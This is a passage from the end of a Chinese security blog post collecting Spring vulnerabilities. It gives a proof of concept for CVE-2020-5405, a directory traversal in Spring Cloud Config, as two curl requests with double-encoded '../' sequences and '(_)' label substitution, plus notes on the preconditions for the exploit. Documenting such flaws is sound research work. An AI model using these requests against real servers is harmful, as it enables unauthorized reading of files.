<p>[<a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md]" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md]</a>(<a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring</a> Cloud/CVE-2020-5405 Spring Cloud Config 目录穿越/README.md)</p>
<p>poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">利用点1：</span><br><span class="line">curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftm</span><br><span class="line">p/aaa.xxx</span><br><span class="line"></span><br><span class="line">读取/User/xuanyonghao/tmp/aaa.xxx文件</span><br><span class="line">foo 对应 &#123;application&#125;</span><br><span class="line">profiles 对应 &#123;profiles&#125;</span><br><span class="line">%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 &#123;label&#125;</span><br><span class="line"></span><br><span class="line">todo 条件限制：</span><br><span class="line">todo 1. 文件必须有后缀，也就是.txt等等。</span><br><span class="line">todo 2. cloud: config: server: native: search-locations: file:///tmp/&#123;label&#125;，此处的目录需要</span><br><span class="line">有&#123;application&#125;或&#123;profiles&#125;或&#123;label&#125;，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀</span><br><span class="line"></span><br><span class="line">利用点2：</span><br><span class="line">org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)</span><br><span class="line">利用此处把label处的(_)替换为/</span><br><span class="line">curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxx</span><br><span class="line"></span><br><span class="line">todo 条件限制：</span><br><span class="line">todo 1. 文件必须有后缀，也就是.txt等等。</span><br><span class="line">todo 2. 不像利用点1处，不需要配置&#123;application&#125;&#123;profiles&#125;&#123;label&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/08/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" rel="next" title="数据库提权">
                <i class="fa fa-chevron-left"></i> 数据库提权
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/08/24/Burpsuite%E7%88%86%E7%A0%B4Basic%E8%AE%A4%E8%AF%81/" rel="prev" title="Burpsuite爆破Basic认证">
                Burpsuite爆破Basic认证 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">白仁</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">56</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Spring漏洞集合"><span class="nav-number">1.</span> <span class="nav-text">Spring漏洞集合</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-CVE-2013-7315-Spring-Framework中的XML外部实体"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 CVE-2013-7315 Spring Framework中的XML外部实体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-CVE-2014-3527-Spring-Security验证绕过漏洞"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 CVE-2014-3527 Spring Security验证绕过漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-CVE-2014-0097-Spring-Security认证绕过"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 CVE-2014-0097 Spring Security认证绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-CVE-2014-3578-Spring-Framework-目录遍历漏洞"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 CVE-2014-3578 Spring Framework 目录遍历漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-CVE-2016-2173-Spring-AMQP中的远程代码执行"><span class="nav-number">1.7.</span> <span class="nav-text">0x06 CVE-2016-2173 Spring AMQP中的远程代码执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞"><span class="nav-number">1.8.</span> <span class="nav-text">0x07 CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞"><span class="nav-number">1.9.</span> <span class="nav-text">0x08 CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-CVE-2016-6652-Spring-Data-JPA-SQL盲注"><span class="nav-number">1.10.</span> <span class="nav-text">0x09 CVE-2016-6652 Spring Data JPA SQL盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞"><span class="nav-number">1.11.</span> <span class="nav-text">0x10 CVE-2017-4971 Spring WebFlow 远程代码执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-CVE-2017-8045-Spring-Amqp中的远程代码执行"><span class="nav-number">1.12.</span> <span class="nav-text">0x11 CVE-2017-8045 Spring Amqp中的远程代码执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码"><span class="nav-number">1.13.</span> <span class="nav-text">0x12 CVE-2017-8046 Spring Data REST PATCH请求远程执行代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-CVE-2018-1258-Spring-Security未经授权的访问"><span class="nav-number">1.14.</span> <span class="nav-text">0x13 CVE-2018-1258 Spring Security未经授权的访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x14-CVE-2018-1259-具有XMLBeam的Spring-DataXXE"><span class="nav-number">1.15.</span> <span class="nav-text">0x14 CVE-2018-1259 具有XMLBeam的Spring DataXXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x15-CVE-2018-1270-Spring-Messaging远程代码执行漏洞"><span class="nav-number">1.16.</span> <span class="nav-text">0x15 CVE-2018-1270 Spring Messaging远程代码执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x16-CVE-2018-1271-Spring-MVC-目录穿越漏洞"><span class="nav-number">1.17.</span> <span class="nav-text">0x16 CVE-2018-1271 Spring MVC 目录穿越漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x17-CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞"><span class="nav-number">1.18.</span> <span class="nav-text">0x17 CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x18-CVE-2018-1260-Spring-Security-Oauth2-远程代码执行"><span class="nav-number">1.19.</span> <span class="nav-text">0x18 CVE-2018-1260 Spring Security Oauth2 远程代码执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x19-CVE-2018-15758-spring-security-oauth2权限提升"><span class="nav-number">1.20.</span> <span class="nav-text">0x19 CVE-2018-15758 spring-security-oauth2权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x20-CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历"><span class="nav-number">1.21.</span> <span class="nav-text">0x20 CVE-2019-3799 Spring Cloud Config Server: 目录遍历</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x21-CVE-2019-3778-Spring-Security-OAuth-开放重定向"><span class="nav-number">1.22.</span> <span class="nav-text">0x21 CVE-2019-3778 Spring Security OAuth 开放重定向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x22-CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><span class="nav-number">1.23.</span> <span class="nav-text">0x22 CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x23-CVE-2019-11269-Spring-Security-OAuth-开放重定向"><span class="nav-number">1.24.</span> <span class="nav-text">0x23 CVE-2019-11269 Spring Security OAuth 开放重定向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x24-CVE-2020-5398-Spring-Framework-RFD漏洞"><span class="nav-number">1.25.</span> <span class="nav-text">0x24 CVE-2020-5398 Spring Framework RFD漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x25-CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露"><span class="nav-number">1.26.</span> <span class="nav-text">0x25 CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">白仁</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
